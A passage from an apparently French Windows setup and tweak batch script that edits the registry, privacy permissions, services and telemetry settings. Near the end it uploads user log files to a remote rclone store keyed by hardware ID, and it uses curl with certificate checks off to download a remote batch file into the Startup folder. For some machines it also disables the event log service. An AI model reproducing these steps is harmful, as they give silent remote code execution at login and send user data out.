		Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP32" /t REG_SZ /d "Y" /f >nul
	    REG.exe import bin\vlc.reg
	    IF NOT EXIST "C:\Users\%username%\Desktop\Logiciels" (
	    	md C:\Users\%username%\Desktop\Logiciels
	    	robocopy "bin\SOFT\Logiciels" "C:\Users\%username%\Desktop\Logiciels" /s /w:1 /r:3
	    )
	    goto :GFD
	) else (
		Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP32" /t REG_SZ /d "Y" /f >nul
	    IF NOT EXIST "C:\Program Files\VideoLAN\VLC\vlc.exe" (
	    	REG.exe import bin\vlc.reg
	    )
	    IF NOT EXIST "C:\Users\%username%\Desktop\Logiciels" (
	    	md C:\Users\%username%\Desktop\Logiciels
	    	robocopy "bin\SOFT\Logiciels" "C:\Users\%username%\Desktop\Logiciels" /s /w:1 /r:3
	    )
	)
	:GFD
	echo Y>bin\SVPP32.END
	DEL bin\SVPP32.STR
)

IF EXIST bin\SVPP33.STR (
	IF NOT EXIST "C:\Program Files\StartAllBack\StartAllBackCfg.exe" (
		IF EXIST "bin\SOFT\StartBack_AiO.exe" Start /wait "" "bin\SOFT\StartBack_AiO.exe" /SILENT
	)
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP33" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP33.END
	DEL bin\SVPP33.STR
)

IF EXIST bin\SVPP34.STR (
	PowerShell -NonInteractive -NoLogo -NoP -C "& {$tmp = (New-TemporaryFile).FullName; CertUtil -generateSSTFromWU -f $tmp; if ( (Get-Item $tmp | Measure-Object -Property Length -Sum).sum -gt 0 ) { $SST_File = Get-ChildItem -Path $tmp; $SST_File | Import-Certificate -CertStoreLocation "Cert:\LocalMachine\Root"; $SST_File | Import-Certificate -CertStoreLocation "Cert:\LocalMachine\AuthRoot" } Remove-Item -Path $tmp}"
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP34" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP34.END
	DEL bin\SVPP34.STR
)

IF EXIST bin\SVPP35.STR (
	echo Y>bin\SVPP35.END
	DEL bin\SVPP35.STR
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP35" /t REG_SZ /d "Y" /f >nul
	PowerRun_x64.exe "bin\DSERVIC\DSER.bat">nul
	PowerRun_x64.exe "bin\servaddon.bat">nul
	timeout /t 02 /nobreak>nul
	call bin\DSERVIC\DSER.bat
)

IF EXIST bin\SVPP36.STR (
	cd /d %~dp0
	call bin\FINAL\FINAL.bat
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP36" /t REG_SZ /d "Y" /f >nul
	cd /d %~dp0
	echo Y>bin\SVPP36.END
	DEL bin\SVPP36.STR
)

IF EXIST bin\SVPP37.STR (
	reg.exe add "HKCR\CLSID\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d "0" /f
	reg.exe add "HKCR\WOW6432Node\CLSID\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d "0" /f
	sc config "eventlog" start=auto
	sc config "vwififlt" start=auto
	sc config "WlanSvc" start=auto
	PowerRun_x64.exe "bin\TEMP.bat">nul
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP37" /t REG_SZ /d "Y" /f >nul
	echo Y>bin\SVPP37.END
	DEL bin\SVPP37.STR
)

IF EXIST bin\SVPP38.STR (
	IF %HHWID% == 191262638503131 (
	    taskkill /IM Explorer.exe /F
	    sc config "eventlog" start=disabled
		sc config "vwififlt" start=disabled
		sc config "WlanSvc" start=disabled
		timeout /t 02 /nobreak>nul
		wmic pagefileset where name="C:\\pagefile.sys" delete
		wmic computersystem where name="%computername%" get AutomaticManagedPagefile | find "TRUE" >nul && wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False
		Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "100000" /f
		Reg.exe import bin\SCP\PERSO\Emplacement.reg
		Reg.exe import C:\Ect\Outils\led\led.reg
		timeout /t 02 /nobreak>nul
		Start Explorer.exe
	)
	for /f "tokens=2 delims==" %%a in ('wmic cpu get L2CacheSize /value') do set "l2cache=%%a"
	for /f "tokens=2 delims==" %%a in ('wmic cpu get L3CacheSize /value') do set "l3cache=%%a"
	(
		Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d "%l2cache%" /f
		Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "ThridLevelDataCache" /t REG_DWORD /d "%l3cache%" /f
	)
	setx DOTNET_CLI_TELEMETRY_OPTOUT 1
	setx POWERSHELL_TELEMETRY_OPTOUT 1
	setx POWERSHELL_CLI_TELEMETRY_OPTOUT 1
	setx DOTNET_TELEMETRY_OPTOUT 1
	timeout /t 02 /nobreak>nul
	Powercfg /SETACTIVE "11111111-1111-1111-1111-111111134587"
	Reg.exe add "HKCU\Software\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f
	Reg.exe add "HKCU\System\GameConfigStore" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "0" /f
	Reg.exe add "HKLM\SOFTWARE\RECS\RWC-TEST" /v "SVPP38" /t REG_SZ /d "Y" /f >nul
	Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /f
	Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /f
	Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /f
	Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /f
	Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:cortana;privacy-automaticfiledownloads;privacy-feedback;windowsinsider;windowsupdate;cortana-windowssearch;;cortana-windowssearch;" /f
	IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
	Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone" /v "Value" /t REG_SZ /d "Allow" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\activity" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\radios" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\bluetoothSync" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Deny" /f
	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
	sc config "Netman" start=auto
	echo Y>bin\SVPP38.END
	DEL bin\SVPP38.STR
)

tasklist /FI "PID eq %TargetPID%" | findstr "cmd.exe" >nul

if %errorlevel% equ 0 (
	IF %IDS%==1 (
		IF EXIST IID.log (
			for /f "usebackq tokens=*" %%a in ("IID.log") do (
    			set "HHWID=%%a"
    			DEL IID.log
    		)
			for /f "usebackq tokens=*" %%a in ("ID.log") do (
    			set "HWID=%%a"
    			DEL ID.log
    		)
			set IDS=2
    		goto :PIDFV
		) else (
			Ping 02>nul
			goto :PIDFV
	)
	)
) else (
	goto :SYSSTP2
)

Ping 02>nul
goto :PIDFV

:SYSSTP2

IF EXIST HWID.txt (
		for /f "usebackq tokens=*" %%a in ("HWID.txt") do (
    	set "HHWID=%%a"
	)
)

cd /d %~dp0
IF EXIST Verif.bat (
	call Verif.bat
) else (
	copy /Y bin\Verif.bat C:\Ect\RWC\
	timeout /t 01 /nobreak>nul
	call Verif.bat
)
:VQTLOG
timeout /t 10 /nobreak>nul
IF NOT EXIST EQT.CONF goto :VQTLOG
IF EXIST QTS-USRL.log (
	IF EXIST rclone.conf (
		IF EXIST QTS-USRL.log rclone --config="rclone.conf" copy QTS-USRL.log QTS:%HHWID%/
	) else (
		echo WIP ## DESSOUS
	)
)

IF EXIST rclone.conf (
	IF EXIST "C:\Ect\RWC\RWC-USRL.log" rclone --config="rclone.conf" copy RWC-USRL.log QTS:%HHWID%/
) else (
	IF EXIST "C:\Ect\RWC\RWC-USRL.log" call C:\Ect\RWC\bin\INFO\slog.bat
)

cd /d %~dp0
curl -g -k -L -# -o "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\endscript.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/endscript.bat"
Ping 10>nul
IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
DEL QTS-USRL.log
DEL ID.log
DEL IID.log
DEL temp2.txt
DEL rclone.conf
DEL RWC-USRL.log
IF %HHWID% == 191262638503131 goto :UVUIY
IF %HHWID% == PF0TRR6A goto :UVUIY
IF %HHWID% == 219925897859274 goto :UVUIY
IF %HHWID% == J216401760 goto :UVUIY
Exit 
:UVUIY
set seed=%time:~9,2%%time:~3,2%%time:~6,2%
set /A rand=(seed * 21) %% 20 + 1
IF %rand%==16 SET WLN=16.jpeg & goto :APBAGG
IF %rand%==17 SET WLN=17.jpeg & goto :APBAGG
IF %rand%==18 SET WLN=18.jpeg & goto :APBAGG
SET WLN=%rand%.png
:APBAGG
set backgroundImage=C:\Ect\Wallp\%WLN%
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%backgroundImage%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
Exit

:FATALERROR
cls
echo.
echo  %red%ERREUR :
echo  IMPOSSIBLE DE TROUVER LE PID%white%
echo.
echo  PID = %PID%
echo.
echo Appuyez sur une touche pour terminer le script.
pause>nul
Exit
